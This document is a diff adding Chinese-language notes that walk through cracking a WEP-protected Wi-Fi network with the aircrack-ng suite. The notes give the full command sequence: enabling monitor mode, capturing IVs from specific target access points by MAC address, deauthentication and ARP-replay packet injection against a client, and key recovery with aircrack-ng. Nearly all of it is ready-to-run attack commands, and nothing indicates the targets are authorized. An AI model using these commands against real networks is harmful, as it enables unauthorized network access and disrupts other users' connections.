@@ -1,0 +1,68 @@
+1、准备工作
+	1.0，本机访问点MAC： F8:A4:5F:18:30:4A，本机wlan0 MAC: d0:df:9a:06:04:6e
+	1.1、终端中输入 sudo apt-get install aircrack-ng 安装aircrack-ng
+	1.2、检查是否有无线网卡 ifconfig -a ;看是否有wlan0的接口。并开启无线网卡wlan0, 使用这个命令：ifconfig wlan0 up ; 然后通过iwconfig命令检查wlan0无线网卡状态。
+	1.3、目标mac : 30:FC:68:CF:D6:0D  ch-6/00:BD:82:5D:FA:00 ch-7
+
+
+
+2、开始破解过程
+	终端1
+	2.1、激活无线网卡的监控模式 ，终端输入 
+		sudo airmon-ng start wlan0
+	2.2、探测无线AP，并抓取无线数据包。在终端输入sudo airodump-ng mon0，可以看到有AP的地址出现在屏幕上面，显示MAc地址和所在频道,以及每个AP和客户端通信的主机，需要记录下需要锁定的目标ssID的mac，以及和他连接的无线客户端mac。
+	
+	终端2
+	2.3、抓包：
+	语法：sudo airodump-ng -c 频道 –bssid 目标主机mac -w wep mon0；wep为默认的存包文件的名字，可以更改。
+		sudo airodump-ng --ivs -c 6 -w longas mon0,不指定抓包的目标MAC地址
+	新开一个终端抓包：sudo airodump-ng --ivs -c 6 --bssid 30:FC:68:CF:D6:0D -w longas  mon0
+	
+	终端3
+	2.4、 发起攻击
+	语法：sudo aireplay-ng -1 0 -a 目标mac -h 本机MAC mon0
+	 sudo aireplay-ng -0 1 -a 00:BD:82:5D:FA:00 -c d0:df:9a:06:04:6e mon0 ( ch 7)
+	参数解释：
+
+	-0 采用deauth攻击模式，后面跟上攻击次数，这里我设置为1，大家可以根据实际情况设置为10不等；
+
+	-a 后跟AP的MAC地址；
+
+	-c 后跟客户端的MAC地址；
+
+	若第三步的窗口中出现握手包，表示攻击有效。
+	最后跟上无线网卡的名称，这里就是mon0啦。
+	sudo aireplay-ng -3 -b 30:FC:68:CF:D6:0D -h d0:df:9a:06:04:6e mon0
+	继续输入sudo aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b 目标MAC -h 本机MAC mon0；此时终端②中的数据会增长很快，当数据到达5000的时候就可以破解了。
+	Ubuntu引起’channel -1’的原因如下：
+Ubuntu会设置无线网卡的频道为-1来扫描可用的无线接入点(AP)，但在扫描结束后并没有更改网卡的频道。当使用aircrack-ng监听握手包时，在发送deauth攻击前使用命令ifconfig wlan1 down关闭network-manager对网卡的管理。这会强制aircrack为网卡设置到正确的频道上，然后再发送deauth攻击。（http://www.codeweblog.com/%E8%A7%A3%E5%86%B3aircrack-ng%E7%9A%84channel-1%E9%97%AE%E9%A2%98/）
+	
+	2.5、开启终端4,
+	进行破解
+	sudo aircrack-ng wep*.cap
+3、结束监控
+	最后 sudo airmon-ng stop mon0结束监控过程。
+	( sudo airmon-ng check可以查看你开启了多少监控，如果运行多组的时候可以查看后选择关闭)。
+	
+操作序列
+终端1：
+sudo airmon-ng start wlan0
+sudo airodump-ng mon0  （AP/Host:  30:FC:68:CF:D6:0D/10:41:7F:E7:01:C6）
+终端2：抓包
+sudo airodump-ng --ivs -c 6 --bssid 30:FC:68:CF:D6:0D -w longas mon0
+终端3：
+sudo aireplay-ng -3 -b 30:FC:68:CF:D6:0D -h d0:df:9a:06:04:6e mon0
+终端四：
+sudo aircrack-ng wep*.cap
+最终:
+结束mon0的监控
+sudo airmon-ng stop mon0
+
+参考连接
+http://www.cnblogs.com/duanguyuan/p/3735046.html
+http://netsecurity.51cto.com/art/201105/264844_all.htm
+http://www.linuxidc.com/Linux/2010-08/28007.htm
+http://www.linuxidc.com/Linux/2014-04/99316.htm
+http://www.linuxdiyf.com/linux/11059.html
+http://blog.sina.com.cn/s/blog_3c2bf90a01019yoj.html
+
